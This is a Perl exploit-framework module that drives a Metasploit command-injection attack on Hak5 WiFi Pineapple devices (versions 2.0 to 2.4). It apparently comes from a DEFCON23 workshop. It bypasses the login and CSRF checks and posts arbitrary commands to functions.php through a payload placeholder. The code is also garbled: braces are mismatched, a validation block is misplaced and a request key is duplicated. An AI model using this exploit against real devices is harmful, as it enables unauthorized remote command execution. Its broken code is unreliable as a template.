package PINEAPPLE::MSF::PineappleBypassCmdinject;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PineappleBypassCmdinject";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

      This module exploits a login/csrf check bypass vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.

      These devices may typically be identified by their SSID beacons of 'Pineapple5_....';

      Provided as part of the TospoVirus workshop at DEFCON23.

      ",
  MSF_MODULE => "pineapple_bypass_cmdinject",
  PATHS => ["components/system/configuration/functions.php"],
  TITLE => "Hak5 WiFi Pineapple Preconfiguration Command Injection",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "Path to the command injection",
  VALUE => "/components/system/configuration/functions.php",
},
  },
      },  VALIDATION => {
    'TSTRING' =>       "Executing",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'commands=echo',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'commands=__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
